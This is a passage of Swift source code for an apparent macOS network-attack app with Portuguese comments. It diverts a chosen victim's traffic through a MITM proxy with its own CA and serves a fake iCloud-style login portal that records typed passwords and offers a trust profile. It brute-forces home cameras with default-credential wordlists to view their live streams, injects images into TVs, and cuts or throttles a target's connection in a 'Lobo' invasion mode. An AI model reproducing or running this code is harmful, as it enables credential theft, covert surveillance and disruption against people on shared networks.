            log.info("CA: \(install ? "instalada" : "removida") — \(res)")
            switch res {
            case .ok:
                return nil
            case .error(let msg):
                return msg
            default:
                return "resposta inesperada do helper"
            }
        } catch {
            return error.localizedDescription
        }
    }

    /// The `.mobileconfig` profile carrying our CA — what the fake login
    /// page offers to the victim ("Confiar neste perfil de rede"). nil
    /// until the CA exists.
    var caProfileData: Data? {
        caManager?.caCertificate.flatMap { MobileConfig.make(caDER: $0) }
    }

    // MARK: - Interception diagnostics
    //
    // Per-domain health of the MITM pipeline. Events come from the proxy
    // (onDiagnose) plus synthesized ones (QUIC seen on a diverted host
    // while UDP/443 isn't blocked → QUIC_INVISIVEL).

    /// Block UDP/443 in the sheep anchor so QUIC clients fall back to
    /// TCP. Off = QUIC flows free (we log it, can't rewrite it).
    var forceTCPFallback = true
    /// Verbose per-connection diagnosis on the proxy + JSONL log.
    var diagnosticMode = false
    let diagLog = DiagLog()

    /// Aggregated status per target domain, newest first.
    var diagByDomain: [DomainDiag] = []

    struct DomainDiag: Identifiable {
        var id: String { domain }
        let domain: String
        var lastEvent: DiagEvent
        var category: DiagCategory
        var count: Int
    }

    /// Turn verbose diagnosis on/off. On: clears the JSONL log and wires
    /// the proxy callbacks. Off: detaches them (zero overhead).
    func setDiagnosticMode(_ on: Bool) {
        diagnosticMode = on
        if on {
            diagLog.clear()
            diagByDomain = []
        }
        proxy?.verboseDiagnostic = on
        proxy?.diagLog = on ? diagLog : nil
        let handler: (@Sendable (DiagEvent) -> Void) = { [weak self] ev in
            Task { @MainActor in self?.recordDiag(ev) }
        }
        proxy?.onDiagnose = on ? handler : nil
        log.info("diag: \(on ? "verbose ON — \(diagLog.path)" : "off")")
    }

    /// Fold a diag event into the per-domain table. User-store heuristic:
    /// a CA_NAO_CONFIA failure from a client that doesn't offer h2 is
    /// almost certainly a native app ignoring user-installed CAs.
    func recordDiag(_ ev: DiagEvent) {
        let domain = ev.sni ?? ev.clientIP ?? "?"
        var cat = ev.category
        var note = ev.detail
        if cat == .caNotTrusted, !(ev.alpn?.contains("h2") ?? false) {
            note = ((note ?? "") + " Cliente não oferece h2 — provável app nativo ignorando a user store.").trimmingCharacters(in: .whitespaces)
        }
        var ev2 = ev; ev2.category = cat; ev2.detail = note
        if let i = diagByDomain.firstIndex(where: { $0.domain == domain }) {
            diagByDomain[i].lastEvent = ev2
            diagByDomain[i].category = cat
            diagByDomain[i].count += 1
        } else {
            diagByDomain.append(DomainDiag(domain: domain, lastEvent: ev2,
                                           category: cat, count: 1))
        }
        diagByDomain.sort { $0.lastEvent.ts > $1.lastEvent.ts }
    }

    // MARK: - Inject (content rewriting)

    /// The shared injection engine — configured once, attached to the
    /// proxy every time Sheep starts.
    let injectionEngine = InjectionEngine()
    private let imageProvider = ImageProvider()
    private let tvDetector = TVDetector()
    private let cameraDetector = CameraDetector()

    var injectionRule = InjectionRule(enabled: false)
    var injectionImages: [PreparedImage] = []
    var injectionSourceLabel: String? = nil   // "foto.png" / "pasta (12)"
    var injectionActive = false
    var tvDetectionRunning = false
    /// IPs Bonjour marked as TV/streamer this session.
    var detectedTVIPs: Set<String> = []

    /// Pick a single image file and load it as the injection pool.
    func pickInjectionImage() {
        guard let url = imageProvider.pickImage() else { return }
        injectionImages = imageProvider.load(from: url)
        injectionSourceLabel = url.lastPathComponent
        if injectionImages.isEmpty {
            lastError = AppError(.invalidInput("imagem não suportada")).description
        }
    }

    /// Pick a folder of images (rotation pool).
    func pickInjectionFolder() {
        guard let url = imageProvider.pickFolder() else { return }
        injectionImages = imageProvider.load(from: url)
        injectionSourceLabel = "\(url.lastPathComponent) (\(injectionImages.count) imagens)"
        if injectionImages.isEmpty {
            lastError = AppError(.invalidInput("pasta sem imagens suportadas")).description
        }
    }

    /// Push the current rule + pool into the engine and attach it to the
    /// running proxy (or the next one started).
    func applyInjection() {
        injectionEngine.configure(rule: injectionRule, images: injectionImages)
        injectionEngine.resizer = { [imageProvider] img, w, h in
            imageProvider.resized(img, width: w, height: h)
        }
        proxy?.injection = injectionEngine
        injectionActive = injectionRule.enabled && !injectionImages.isEmpty
        if injectionActive {
            log.info("inject: ativo — \(injectionImages.count) imagem(ns), escopo \(injectionRule.scope)")
        }
    }

    /// Disable rewriting without touching spoof/rdr (traffic keeps flowing,
    /// images stop being replaced).
    func stopInjection() {
        injectionEngine.disable()
        injectionActive = false
        log.info("inject: desligado")
    }

    /// One-click "show my image on this TV": scope the rule to the TV's IP,
    /// divert its traffic through us, and make sure Sheep intercepts it.
    func injectOnTV(_ host: Host) async {
        guard !injectionImages.isEmpty else {
            lastError = AppError(.invalidInput("escolha uma imagem primeiro")).description
            return
        }
        injectionRule.targetIPs = [host.ip]
        injectionRule.enabled = true
        applyInjection()

        if !host.isDiverted && !host.isKilled {
            await toggleDivert(host)
        }
        // The wildcard rdr already covers the TV's traffic once diverted.
        if !sheepRunning {
            await startSheep()
        }
        log.info("inject: TV \(host.ip) — divert+sheep+rewrite ativos")
    }

    /// Fail-safe: rewriting off, interception off, ARP restored.
    func revertAll() async {
        stopInjection()
        if sheepRunning { await stopSheep() }
        if await restoreAll() { log.info("revert: restauração confirmada") }
    }

    // MARK: - TV detection (Bonjour + OUI)

    func startTVDetection() {
        guard !tvDetectionRunning else { return }
        tvDetector.onChange = { [weak self] ips in
            Task { @MainActor in
                self?.detectedTVIPs = ips
                self?.classifyHosts()
            }
        }
        tvDetector.start()
        tvDetectionRunning = true
        log.info("tv: escutando Bonjour (airplay/cast/raop…)")
    }

    func stopTVDetection() {
        tvDetector.stop()
        tvDetectionRunning = false
    }

    /// Mark hosts as .tv when their IP was seen in a Bonjour service
    /// (active browse or passive mDNS sniff), or their OUI vendor matches
    /// a TV manufacturer.
    private func classifyHosts() {
        let sniffedTVs = Set(mdnsObservations
            .filter { Self.isTVServiceType($0.serviceType) }
            .flatMap { [$0.sourceIP] + $0.addresses })
        for i in hosts.indices {
            guard hosts[i].kind != .tv else { continue }
            if detectedTVIPs.contains(hosts[i].ip) || sniffedTVs.contains(hosts[i].ip) {
                hosts[i].kind = .tv
            } else if let v = hosts[i].vendor?.lowercased(),
                      TVDetector.vendorKeywords.contains(where: { v.contains($0) }) {
                hosts[i].kind = .tv
            }
        }
    }

    /// Does a sniffed mDNS service type look like a TV/streamer service?
    static func isTVServiceType(_ serviceType: String) -> Bool {
        let s = serviceType.lowercased()
        return TVDetector.serviceTypes.contains { s.contains($0.trimmingCharacters(in: CharacterSet(charactersIn: "."))) }
            || s.contains("airplay") || s.contains("googlecast") || s.contains("raop")
            || s.contains("dial") || s.contains("roku") || s.contains("dlna")
    }

    // MARK: - Camera detection (Bonjour + OUI + port probe + RTSP snapshot)

    /// Start Bonjour-based camera discovery. Mirrors startTVDetection.
    /// OUI + port-probe classification runs in scanForCameras().
    func startCameraDetection() {
        guard !cameraDetectionRunning else { return }
        cameraDetector.onChange = { [weak self] ips in
            Task { @MainActor in
                self?.detectedCameraIPs = ips
                self?.classifyCameras()
            }
        }
        cameraDetector.start()
        cameraDetectionRunning = true
        log.info("camera: escutando Bonjour (rtsp/onvif/camera…)")
    }

    func stopCameraDetection() {
        cameraDetector.stop()
        cameraDetectionRunning = false
    }

    /// Mark hosts as cameras based on Bonjour IPs, OUI vendor, and sniffed
    /// mDNS service types. Only upgrades generic hosts (never downgrades
    /// a TV, and never overwrites an existing camera classification).
    /// Excluded hosts (this Mac, the gateway) are never cameras.
    private func classifyCameras() {
        let sniffedCameras = Set(mdnsObservations
            .filter { Self.isCameraServiceType($0.serviceType) }
            .flatMap { [$0.sourceIP] + $0.addresses })
        for i in hosts.indices {
            guard hosts[i].kind == .generic, !hosts[i].isExcluded else { continue }
            if detectedCameraIPs.contains(hosts[i].ip) || sniffedCameras.contains(hosts[i].ip) {
                hosts[i].kind = .camera
            } else if let v = hosts[i].vendor?.lowercased(),
                      CameraDetector.vendorKeywords.contains(where: { v.contains($0) }) {
                hosts[i].kind = .camera
            }
        }
        rebuildCameraList()
    }

    /// Does a sniffed mDNS service type look like a camera service?
    static func isCameraServiceType(_ serviceType: String) -> Bool {
        let s = serviceType.lowercased()
        return CameraDetector.serviceTypes.contains { s.contains($0.trimmingCharacters(in: CharacterSet(charactersIn: "."))) }
            || s.contains("rtsp") || s.contains("onvif") || s.contains("h264") || s.contains("h265")
    }

    /// Rebuild the cameras list from classified hosts. Preserves
    /// snapshot/detection data already gathered for each camera.
    /// Excluded hosts (this Mac, the gateway) are filtered out — they
    /// can't be cameras (the Mac's own Bonjour services otherwise show
    /// up as a false positive).
    private func rebuildCameraList() {
        let cameraHosts = hosts.filter { $0.kind == .camera && !$0.isExcluded }
        var existing: [String: CameraInfo] = [:]
        for c in cameras { existing[c.id] = c }
        cameras = cameraHosts.map { host in
            let onvif = onvifDevices[host.ip]
            if let prev = existing[host.id] {
                var updated = prev
                updated.ip = host.ip
                updated.vendor = host.vendor
                updated.hostname = host.hostname ?? onvif?.name
                updated.onvifXAddr = onvif?.xaddr
                if onvif != nil { updated.detectionSource = .onvif }
                return updated
            }
            // Determine the detection source for new cameras.
            let source: CameraDetectionSource
            if onvif != nil {
                source = .onvif
            } else if detectedCameraIPs.contains(host.ip) {
                source = .bonjour
            } else if let v = host.vendor?.lowercased(),
                      CameraDetector.vendorKeywords.contains(where: { v.contains($0) }) {
                source = .oui
            } else {
                source = .portProbe
            }
            return CameraInfo(id: host.id, ip: host.ip, mac: host.mac,
                             vendor: host.vendor, hostname: host.hostname ?? onvif?.name,
                             detectionSource: source, codec: nil, openPorts: nil,
                             authNote: nil, onvifXAddr: onvif?.xaddr, rtspPath: nil)
        }
    }

    /// Active scan for cameras: probe RTSP(554)/ONVIF(3702,8000)/HTTP(80,8080)
    /// on every non-excluded host that isn't already classified as a TV.
    /// Hosts with an open camera port get marked .camera and added to the
    /// list. Runs entirely through the helper (needs raw sockets for the
    /// probe; the app side just sends the request).
    func scanForCameras() async {
        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            log.error("scanForCameras: helper offline")
            return
        }
        // First, classify via Bonjour + OUI (no helper needed).
        classifyCameras()

        // WS-Discovery: ONVIF cameras answer a UDP 3702 probe with their
        // device service URL — the same discovery ONVIF Device Manager
        // does. High-confidence classification + we keep the xaddr to
        // resolve exact stream URIs later. ~2.5s, runs unprivileged.
        let found = await Task.detached { OnvifProbe.discover(window: 2.5) }.value
        for dev in found {
            onvifDevices[dev.ip] = dev
            if let host = hosts.first(where: { $0.ip == dev.ip && !$0.isExcluded }),
               host.kind == .generic {
                updateHost(id: host.id) { $0.kind = .camera }
                log.info("camera: \(dev.ip) respondeu WS-Discovery (ONVIF\(dev.name.map { " — \($0)" } ?? ""))")
            }
        }
        rebuildCameraList()

        // Then port-probe the remaining unclassified hosts.
        let probePorts: [UInt16] = [554, 3702, 8000, 80, 8080, 8554]
        let candidates = hosts.filter {
            !$0.isExcluded && $0.kind == .generic && !isMulticastOrBroadcast($0.ip)
        }
        guard !candidates.isEmpty else { return }
        let client = HelperClient()
        for host in candidates {
            do {
                let res = try await client.send(.portProbe(targetIP: host.ip, ports: probePorts))
                if case .portProbeResult(_, let open) = res, !open.isEmpty {
                    // Camera-like port open → mark as camera.
                    updateHost(id: host.id) { $0.kind = .camera }
                    log.info("camera: \(host.ip) confirmado por porta(s) \(open.map(String.init).joined(separator: ","))")
                }
            } catch {
                log.error("scanForCameras: \(host.ip) — \(error.localizedDescription)")
            }
        }
        rebuildCameraList()
    }

    /// Verifica se a câmera está no mesmo /24 que a Wi-Fi atual do Mac.
    /// Câmera em outra rede (ex.: loja vs. casa) nunca responde sem ponte/VPN —
    /// em vez de deixar o usuário esperar timeout, avisamos na hora.
    func cameraOnLocalNetwork(_ camera: CameraInfo) -> Bool {
        guard let local = network.localIP else { return true }
        func prefix3(_ ip: String) -> String {
            ip.components(separatedBy: ".").prefix(3).joined(separator: ".")
        }
        return prefix3(local) == prefix3(camera.ip)
    }

    /// Grab a snapshot from a single camera via RTSP (JPEG-over-RTP) or the
    /// HTTP snapshot fallback. Stores the result in cameraSnapshots.
    func snapshotCamera(_ camera: CameraInfo) async {
        guard !snapshotInProgress.contains(camera.id) else { return }
        if !cameraOnLocalNetwork(camera) {
            let subnet = camera.ip.components(separatedBy: ".").prefix(3).joined(separator: ".") + ".x"
            lastError = "Câmera \(camera.ip) está em outra rede (\(subnet)) — conecte o Wi-Fi dela primeiro."
            return
        }
        snapshotInProgress.insert(camera.id)
        defer { snapshotInProgress.remove(camera.id) }

        reloadSharedCreds()   // deepcrack may have cracked it while we run
        var paths = Self.commonStreamPaths
        if let known = camera.rtspPath {
            paths.removeAll { $0 == known }
            paths.insert(known, at: 0)
        }
        let client = RTSPSnapshotClient(
            host: camera.ip,
            fallbackPaths: paths,
            credentials: credentialCandidates(for: camera.id))
        client.onAuthenticated = { [weak self] cred in
            Task { @MainActor in
                self?.noteWorkingCredential(cred, cameraID: camera.id, ip: camera.ip)
            }
        }
        let result = await client.snapshot()
        switch result {
        case .success(let snap):
            cameraSnapshots[camera.id] = snap
            log.info("camera: snapshot de \(camera.ip) (\(snap.data.count) bytes via \(snap.sourceURL))")
        case .noJPEGStream(let codec):
            // Update the codec so the UI shows what the camera is.
            if let i = cameras.firstIndex(where: { $0.id == camera.id }) {
                cameras[i].codec = codec
            }
            log.info("camera: \(camera.ip) é \(codec) — sem snapshot JPEG")
        case .failed(let msg):
            log.error("camera: snapshot de \(camera.ip) falhou — \(msg)")
        }
    }

    /// Snapshot all detected cameras in parallel.
    func snapshotAllCameras() async {
        await withTaskGroup(of: Void.self) { group in
            for cam in cameras {
                group.addTask { await self.snapshotCamera(cam) }
            }
        }
    }

    // MARK: - Live streaming (RTSP continuous)

    /// Start a live RTSP stream for a camera. Frames are published to
    /// `liveFrames[cameraID]` as they arrive. The stream runs until
    /// stopLiveStream is called or the connection drops.
    func startLiveStream(for camera: CameraInfo, bruteForce: Bool = false) {
        let id = camera.id
        guard liveStreamClients[id] == nil else { return }
        if !cameraOnLocalNetwork(camera) {
            // Sem ponte entre /24s, live nunca abre — falha na hora em vez de timeout.
            let subnet = camera.ip.components(separatedBy: ".").prefix(3).joined(separator: ".") + ".x"
            liveStreamErrors[id] = "Em outra rede (\(subnet)) — conecte o Wi-Fi dela"
            liveStreamActive.remove(id)
            log.info("camera: live para \(camera.ip) abortado (câmera em outra rede)")
            return
        }
        reloadSharedCreds()   // deepcrack may have cracked it while we run
        liveStreamActive.insert(id)
        liveStreamErrors.removeValue(forKey: id)
        liveAuthProgress.removeValue(forKey: id)
        log.info("camera: live stream iniciado para \(camera.ip)\(bruteForce ? " (brute-force \(Self.wordlistPasswords.count * 3) senhas)" : "")")

        Task { [weak self] in
            guard let self, self.liveStreamActive.contains(id) else { return }

            var port = 554
            var paths = Self.commonStreamPaths
            var creds = self.credentialCandidates(for: id, includeWordlist: bruteForce)

            // Prefer the exact stream path learned earlier via ONVIF;
            // otherwise ask the camera's ONVIF service for it — this
            // also validates which credential works before RTSP starts.
            if let known = camera.rtspPath {
                paths.removeAll { $0 == known }
                paths.insert(known, at: 0)
            } else if let xaddr = camera.onvifXAddr {
                let onvifCreds = self.credentialCandidates(for: id)
                    .map { (user: $0.user, pass: $0.pass) }
                if let res = await Task.detached(operation: {
                    OnvifClient.streamURIs(xaddr: xaddr, credentials: onvifCreds)
                }).value, let uri = res.uris.first,
                   let u = URL(string: uri), u.host == camera.ip {
                    var p = u.path.isEmpty ? "/" : u.path
                    if let q = u.query { p += "?\(q)" }
                    if let up = u.port { port = up }
                    paths.removeAll { $0 == p }
                    paths.insert(p, at: 0)
                    if let i = self.cameras.firstIndex(where: { $0.id == id }) {
                        self.cameras[i].rtspPath = p
                    }
                    self.log.info("camera: \(camera.ip) ONVIF stream URI → \(uri)")
                    if let wc = res.credential {
                        let isDefault = Self.defaultCameraCredentials.contains {
                            $0.user == wc.user && $0.pass == wc.pass
                        } || Self.wordlistPasswords.contains(wc.pass)
                        self.noteWorkingCredential(
                            (wc.user, wc.pass, isDefault), cameraID: id, ip: camera.ip)
                        creds.removeAll { $0.user == wc.user && $0.pass == wc.pass }
                        creds.insert((wc.user, wc.pass, isDefault), at: 0)
                    }
                }
            }

            guard self.liveStreamActive.contains(id),
                  self.liveStreamClients[id] == nil else { return }
            let client = RTSPStreamClient(
                host: camera.ip, port: port,
                path: paths.first ?? "/",
                fallbackPaths: Array(paths.dropFirst()),
                credentials: creds)
            self.liveStreamClients[id] = client

            client.onAuthenticated = { [weak self] cred in
                Task { @MainActor in
                    self?.noteWorkingCredential(cred, cameraID: id, ip: camera.ip)
                }
            }

            client.onAuthProgress = { [weak self] attempt, total in
                Task { @MainActor in
                    self?.liveAuthProgress[id] = "senha \(attempt)/\(total)"
                }
            }

            client.onFrame = { [weak self] frame in
                Task { @MainActor in
                    guard let self else { return }
                    switch frame {
                    case .image(let img):
                        self.liveFrames[id] = img
                        self.liveAuthProgress.removeValue(forKey: id)
                    case .codecDetected(let codec):
                        self.liveAuthProgress.removeValue(forKey: id)
                        if let i = self.cameras.firstIndex(where: { $0.id == id }) {
                            self.cameras[i].codec = codec
                        }
                    case .error(let msg):
                        self.log.error("camera: live \(camera.ip) — \(msg)")
                        self.liveStreamErrors[id] = msg
                        self.liveAuthProgress.removeValue(forKey: id)
                        self.liveStreamActive.remove(id)
                        self.liveStreamClients.removeValue(forKey: id)
                    }
                }
            }

            let streamClient = client
            // stream() has a tight non-suspending read/poll loop — running
            // it on the MainActor (this class's default) would freeze the UI
            // on "conectando…" and starve every onFrame task of a slot.
            // Run it detached; frames hop back via Task { @MainActor }.
            Task.detached { [weak self] in
                await streamClient.stream()
                Task { @MainActor [weak self, id] in
                    guard let self else { return }
                    // Stream ended (EOF, reconnects exhausted). If this
                    // client is still the one registered for the camera
                    // (not replaced by a newer start), clean up.
                    if self.liveStreamClients[id] === streamClient {
                        self.liveStreamErrors[id] = self.liveFrames[id] != nil
                            ? "transmissão encerrada pela câmera"
                            : "transmissão encerrada"
                        self.liveAuthProgress.removeValue(forKey: id)
                        self.liveStreamActive.remove(id)
                        self.liveStreamClients.removeValue(forKey: id)
                        self.log.info("camera: live \(camera.ip) terminou (EOF/reconexões esgotadas)")
                    }
                }
            }
        }
    }

    /// Stop a live stream for a camera.
    func stopLiveStream(for camera: CameraInfo) {
        let id = camera.id
        liveStreamClients[id]?.stop()
        liveStreamClients.removeValue(forKey: id)
        liveStreamActive.remove(id)
        liveFrames.removeValue(forKey: id)
        liveStreamErrors.removeValue(forKey: id)
        liveAuthProgress.removeValue(forKey: id)
        log.info("camera: live stream parado para \(camera.ip)")
    }

    /// Stop all active live streams.
    func stopAllLiveStreams() {
        for client in liveStreamClients.values { client.stop() }
        liveStreamClients.removeAll()
        liveStreamActive.removeAll()
        liveFrames.removeAll()
        liveStreamErrors.removeAll()
        liveAuthProgress.removeAll()
    }

    /// Toggle a live stream on/off for a camera.
    func toggleLiveStream(for camera: CameraInfo) {
        if liveStreamActive.contains(camera.id) {
            stopLiveStream(for: camera)
        } else {
            startLiveStream(for: camera)
        }
    }

    /// Start the transparent proxy + wildcard pf redirect. With the CA
    /// wired (ensureCAManager) HTTPS is terminated and decrypted — full
    /// MITM when the CA is trusted system-wide; without trust the victim
    /// sees cert warnings but the capture still works. Plain HTTP is
    /// captured fully either way.
    func startSheep() async {
        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            log.error("startSheep: helper offline")
            return
        }

        if proxy == nil {
            ensureCAManager()
            proxy = TransparentProxy(port: 8080) { [weak self] ex in
                Task { @MainActor in self?.addCapturedRequest(ex) }
            }
            proxy?.injection = injectionEngine
            // Com a CA ligada o HTTPS é terminado no proxy (MITM) em vez
            // de ser só túnel SNI.
            proxy?.caManager = caManager
            // Modo Criminoso: credenciais do portal falso vão para a colheita.
            proxy?.onCredential = { [weak self] cred in
                Task { @MainActor in self?.appendCapturedCredential(cred) }
            }
            proxy?.portalSSID = wifiCurrent?.ssid ?? ""
            // Re-attach diagnostics if the mode was left on.
            if diagnosticMode { setDiagnosticMode(true) }
        }
        do {
            try await proxy?.start()
            log.info("proxy transparente escutando em 127.0.0.1:8080")
        } catch {
            lastError = AppError(.proxyFailed(error.localizedDescription)).description
            log.error("startSheep: proxy — \(error.localizedDescription)")
            return
        }

        // Tell the helper to install the wildcard pf rdr rules.
        let client = HelperClient()
        do {
            let res = try await client.send(.sheepStart(forceTCPFallback: forceTCPFallback))
            if case .ok = res {
                sheepRunning = true
                updateDirtyState()
                log.info("sheep: captura transparente ativa")
            } else if case .error(let msg) = res {
                lastError = AppError(.proxyFailed(msg)).description
                log.error("startSheep: helper — \(msg)")
                proxy?.stop()
            }
        } catch {
            lastError = AppError(.helperSocketFailed(error.localizedDescription)).description
            log.error("startSheep: \(error.localizedDescription)")
            proxy?.stop()
        }
    }

    func stopSheep() async {
        guard sheepRunning || proxy != nil else { return }
        guard helper.responding else {
            recoveryRequired = true
            updateDirtyState()
            lastError = "O serviço está indisponível. A remoção do redirecionamento continua pendente."
            return
        }
        do {
            let response = try await restoreRequest(.sheepStop)
            guard case .ok = response else {
                recoveryRequired = true
                updateDirtyState()
                lastError = "Não foi possível parar a sessão: \(response)"
                return
            }
            proxy?.stop()
            proxy = nil
            sheepRunning = false
            updateDirtyState()
            log.info("Sessão parada; remoção do redirecionamento confirmada.")
        } catch {
            recoveryRequired = true
            updateDirtyState()
            lastError = "Não foi possível parar a sessão: \(error.localizedDescription)"
        }
    }

    // MARK: - Lobo mode (one-click invasion)
    //
    // One target, one red button. Divert forces the target through the
    // Sheep proxy; the captive portal then owns its browser (OS
    // connectivity probes answer "offline" → iOS/Android force-open the
    // URL); optional periodic cuts (pulso) or a dummynet throttle
    // (gargalo) squeeze it. Retreat unwinds everything.

    /// Weapons Lobo can carry into an invasion.
    public enum LoboWeapon: String, CaseIterable, Identifiable, Codable {
        case portal  = "Portal cativo"
        case pulso   = "Pulso"
        case gargalo = "Gargalo"
        public var id: String { rawValue }
    }

    var loboTargetID: Host.ID?
    var loboWeapons: Set<LoboWeapon> = [.portal]
    var loboMessage = "Conexão estabelecida com sucesso ✓"
    var loboImageData: Data?
    var loboImageName: String?
    var loboPulseEvery = 45          // seconds between cuts
    var loboPulseCut = 4             // seconds each cut lasts
    private(set) var loboActive = false
    private var loboPulseTask: Task<Void, Never>?

    /// Gargalo steady state: ~50 Kbit/s — a web page takes minutes,
    /// streaming dies, but the device still looks "connected".
    private static let loboGargaloKbit = 50

    var loboTarget: Host? {
        guard let id = loboTargetID else { return nil }
        return hosts.first { $0.id == id }
    }

    var loboReady: Bool {
        guard let t = loboTarget, !t.isExcluded, !t.ip.isEmpty else { return false }
        return true
    }

    func loboInvade() async {
        guard let target = loboTarget, !target.isExcluded else {
            lastError = AppError(.invalidInput("Escolha um alvo primeiro")).description
            return
        }
        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            return
        }

        // 1) Route everything from the target through our proxy.
        if !target.isDiverted { await toggleDivert(target) }

        // 2) The Sheep proxy must be up to serve the portal page.
        if !sheepRunning { await startSheep() }
        guard sheepRunning else { return }

        // 3) Captive portal aimed at this target.
        if loboWeapons.contains(.portal) { applyLoboPortal(to: target) }

        // 4) Throttle steady state (if armed) + pulse loop on top.
        if loboWeapons.contains(.gargalo) {
            await applySelectivePolicy(loboGargaloPolicy(for: target.ip))
        }
        restartLoboPulseIfNeeded(targetIP: target.ip)

        loboActive = true
        lastError = nil
        markStateDirty()
        log.info("lobo: invasão ativa em \(target.hostname) (\(target.ip))")
    }

    func loboRetreat() async {
        loboActive = false
        loboPulseTask?.cancel()
        loboPulseTask = nil
        guard let target = loboTarget else {
            proxy?.portalRule = nil
            return
        }
        let client = HelperClient()
        _ = try? await client.send(.killSelectiveClear(targetIP: target.ip))
        proxy?.portalRule = nil
        if target.isDiverted { await toggleDivert(target) }
        log.info("lobo: recuado de \(target.hostname)")
        markStateDirty()
    }

    /// Live weapon toggles while active re-apply without a full invade.
    func setLoboWeapon(_ weapon: LoboWeapon, on: Bool) {
        if on { loboWeapons.insert(weapon) } else { loboWeapons.remove(weapon) }
        guard loboActive, let target = loboTarget else {
            markStateDirty()
            return
        }
        switch weapon {
        case .portal:
            if on { applyLoboPortal(to: target) } else { proxy?.portalRule = nil }
        case .pulso:
            restartLoboPulseIfNeeded(targetIP: target.ip)
            if !on, !loboWeapons.contains(.gargalo) {
                Task { await clearSelectivePolicy(targetIP: target.ip) }
            }
        case .gargalo:
            if on {
                Task { await applySelectivePolicy(loboGargaloPolicy(for: target.ip)) }
            } else if !loboWeapons.contains(.pulso) {
                Task { await clearSelectivePolicy(targetIP: target.ip) }
            }
            // else: pulse loop will restore its steady state next cycle.
        }
        markStateDirty()
    }

    /// Message/image changed while the portal is live — push new HTML.
    func loboPortalContentChanged() {
        guard loboActive, loboWeapons.contains(.portal), let target = loboTarget else { return }
        applyLoboPortal(to: target)
    }

    /// Pick the best automatic invasion target: prefer named devices
    /// (phones/laptops people own), skip TVs/cameras (no browser for
    /// the portal) and the excluded self/gateway.
    static func autoTarget(from hosts: [Host]) -> Host? {
        let pool = hosts.filter { !$0.isExcluded && $0.kind != .tv && $0.kind != .camera }
        return pool.first { $0.hostname != nil } ?? pool.first
    }

    /// One-click Lobo against the best target found on the network.
    func loboAuto() async {
        guard let target = Self.autoTarget(from: hosts) else {
            lastError = AppError(.invalidInput("Nenhum alvo disponível — rode o Scan")).description
            return
        }
        loboTargetID = target.id
        if loboWeapons.isEmpty { loboWeapons = [.portal] }
        await loboInvade()
    }

    /// Point Lobo at a specific host from the Arma roster and invade.
    func loboOnHost(_ host: Host) async {
        guard host.id != loboTargetID || !loboActive else { return }
        loboTargetID = host.id
        if loboWeapons.isEmpty { loboWeapons = [.portal] }
        await loboInvade()
    }

    // MARK: Lobo internals

    private func applyLoboPortal(to target: Host) {
        guard let proxy else { return }
        proxy.portalSSID = wifiCurrent?.ssid ?? ""
        let html: String
        var caProfile: Data? = nil
        if loboPortalStyle == .login {
            caProfile = caProfileData
            html = CredentialPortal.loginHTML(style: loboLoginFlavor,
                                              showCALink: caProfile != nil)
        } else {
            html = PortalPage.pageHTML(message: loboMessage,
                                       imageBase64: loboImageData?.base64EncodedString())
        }
        proxy.portalRule = PortalRule(targetIP: target.ip, html: Data(html.utf8),
                                      caProfile: caProfile)
        log.info("lobo: portal \(loboPortalStyle.rawValue) ativo para \(target.ip)")
    }

    private func loboGargaloPolicy(for ip: String) -> KillPolicy {
        KillPolicy(targetIP: ip, rateLimitKbit: Self.loboGargaloKbit)
    }

    /// Periodic full-cut loop: every `loboPulseEvery` seconds, drop all
    /// of the target's traffic for `loboPulseCut` seconds, then restore
    /// the steady state (gargalo pipe if armed, otherwise no rules).
    private func restartLoboPulseIfNeeded(targetIP ip: String) {
        loboPulseTask?.cancel()
        loboPulseTask = nil
        guard loboActive, loboWeapons.contains(.pulso) else { return }
        let every = max(5, loboPulseEvery)
        let cut = max(1, min(loboPulseCut, every / 2))
        log.info("lobo: pulso a cada \(every)s (corte de \(cut)s) em \(ip)")
        loboPulseTask = Task { [weak self] in
            while !Task.isCancelled {
                try? await Task.sleep(nanoseconds: UInt64(every) * 1_000_000_000)
                guard let self, self.loboWeapons.contains(.pulso), !Task.isCancelled else { break }
                let client = HelperClient()
                _ = try? await client.send(.killSelective(policy: KillPolicy(targetIP: ip)))
                try? await Task.sleep(nanoseconds: UInt64(cut) * 1_000_000_000)
                guard !Task.isCancelled else { break }
                if self.loboWeapons.contains(.gargalo) {
                    _ = try? await client.send(.killSelective(policy: self.loboGargaloPolicy(for: ip)))
                } else {
                    _ = try? await client.send(.killSelectiveClear(targetIP: ip))
                }
            }
        }
    }

    // MARK: - Modo Criminoso (one-click harvest)
    //
    // The "crime" layer on top of Lobo: a fake-login portal that records
    // whatever credentials the target types (Colheita), a CA profile the
    // portal offers for one-tap trust (the MITM trap), and a Wi-Fi
    // "caça-senha" (deauth burst + EAPOL/PMKID capture → hashcat lines).

    /// Face of the captive portal. `.login` swaps the message page for a
    /// believable sign-in form that posts to our cred endpoint.
    public enum PortalStyle: String, CaseIterable, Identifiable, Codable {
        case notice = "Aviso"
        case login = "Login (captura senha)"
        public var id: String { rawValue }
    }

    var loboPortalStyle: PortalStyle = UserDefaults.standard.string(forKey: "pastoral.portalStyle").flatMap(PortalStyle.init) ?? .notice {
        didSet {
            UserDefaults.standard.set(loboPortalStyle.rawValue, forKey: "pastoral.portalStyle")
            if loboActive, loboWeapons.contains(.portal), let t = loboTarget {
                applyLoboPortal(to: t)
            }
        }
    }
    var loboLoginFlavor: CredentialPortal.PageStyle = UserDefaults.standard.string(forKey: "pastoral.loginFlavor").flatMap(CredentialPortal.PageStyle.init) ?? .icloud {
        didSet {
            UserDefaults.standard.set(loboLoginFlavor.rawValue, forKey: "pastoral.loginFlavor")
            if loboActive, loboWeapons.contains(.portal), let t = loboTarget,
               loboPortalStyle == .login {
                applyLoboPortal(to: t)
            }
        }
    }

    // MARK: Colheita (credential harvest store)

    /// Credentials captured from the fake-login portal, newest first.
    var harvested: [CapturedCredential] = []

    @ObservationIgnored private static let harvestFileURL: URL = {
        let base = FileManager.default.urls(for: .applicationSupportDirectory, in: .userDomainMask).first!
        return base.appendingPathComponent("Pastoral/harvest.jsonl")
    }()

    func loadHarvest() {
        guard let data = try? Data(contentsOf: Self.harvestFileURL),
              let text = String(data: data, encoding: .utf8) else { return }
        var items: [CapturedCredential] = []
        for line in text.split(separator: "\n") where !line.isEmpty {
            if let c = try? JSONDecoder().decode(CapturedCredential.self, from: Data(line.utf8)) {
                items.append(c)
            }
        }
        harvested = items
    }

    func appendCapturedCredential(_ cred: CapturedCredential) {
        harvested.insert(cred, at: 0)
